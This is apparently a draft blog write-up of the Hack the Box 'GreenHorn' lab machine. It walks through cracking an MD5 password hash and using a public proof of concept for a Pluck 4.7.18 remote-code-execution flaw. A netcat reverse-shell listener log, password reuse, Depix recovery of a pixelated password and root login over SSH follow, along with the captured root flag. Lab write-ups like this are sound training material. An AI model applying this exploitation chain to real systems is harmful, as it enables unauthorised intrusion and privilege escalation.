---
draft: true
title: 
date: 2024-09-19
author: William
category: 
tags: 
description: 
cover:
  image: GreenHorn.png
  alt: GreenHorn.png
---

I would be lying if I said I posted this Hack the Box Greenhorn writeup within the same week of me exploiting it. In truth life happened. I did a SANs and a couple of late nights out. But here it is, my greenhorn writeup. 

## Enumeration


Nmap scan findings

3000 → git tea

Hosating pluck 4.7.18

[https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC)

cool we have an exploit but we need to authenticate for that.

Looking through the repo more we find MD5 hash is used for passwords… and under settings we have pass.php with a funny looking hash

Taking that badboy and throwing it into [https://crackstation.net/](https://crackstation.net/)

and we have a match!!! `iloveyou1` lets have a look at this pluck webserver running on port 80

Navigating to the login page we only need to put in a password

inputting the password we login. Now to leverage the sweet sweet remote code execution

## Exploitation

Looking closer at the script it needs

```bash
login_url = "http://<hostname>/login.php"
upload_url = "http://<hostname>/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "<password>","<username>": "","submit": "Log in"}
```

Inspecting the login payload we get the user `bogus`

Constomizing the payload and opening my netcat to listen and we get a call home

```bash
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.62] from (UNKNOWN) [10.10.11.25] 44696
SOCKET: Shell has connected! PID: 84927
whoami
www-data
```

looking around the box we find two users `git` and `junior` git we get permission denied but junior!!!

```bash
ls /home/junior
Using OpenVAS.pdf
archivo.pdf
linpeas.sh
user.txt
```

Boys rocking linpeas like a pro! Saddly for user.txt we get permission denied. CAN YOU blame me.. It was worth the try. We need to achieve persistence. SSH to the box fails, with junior being locked down with a public key.

Nothing much else of interest after poking around. But I got to the point of insanity where I was trying to extract the .pdf files by writing my own custom HTTP server that would accept POST request is dawned on me.

```bash
su junior
Password: iloveyou1
whoami
junior

cat user.txt
============ USER_FLAG ============ 

```

## Privilege Escalation 

Insert table flip here

Cool now we can also look at the PDF files by hosting an http server on the box and pull the files

```bash
python3 -m http.server

-------
└─$ wget <http://10.10.11.25:8080/Using\\> OpenVAS.pdf

```

![image.png](https://i.imgur.com/DqVqGGd.png)

That enter password looks mighty interesting. God knows why they did this this way but who am I to judge.

We go this lovely repo that can help us out

[https://github.com/spipm/Depix](https://github.com/spipm/Depix)

this will unpixulate the file

```bash
└─$ python depix.py -p ../pix.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png 

```

![image.png](https://i.imgur.com/sQ4XjKl.png)

Go from this to this

![image.png](https://i.imgur.com/vAruc7U.png)

Now we follow the guide and use this for root access

```bash
└─$ ssh root@10.10.11.25  
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/pro>

 System information as of Thu Jul 18 12:55:06 PM UTC 2024

  System load:           0.1
  Usage of /:            56.7% of 3.45GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             255
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.25
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ce54

This system is built by the Bento project by Chef Software
More information can be found at <https://github.com/chef/bento>
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~#

root@greenhorn:~# cat root.txt 
8d5c73646256b5601c51ad25a7d4d4b9

```

[https://www.hackthebox.com/achievement/machine/1695260/617](https://www.hackthebox.com/achievement/machine/1695260/617)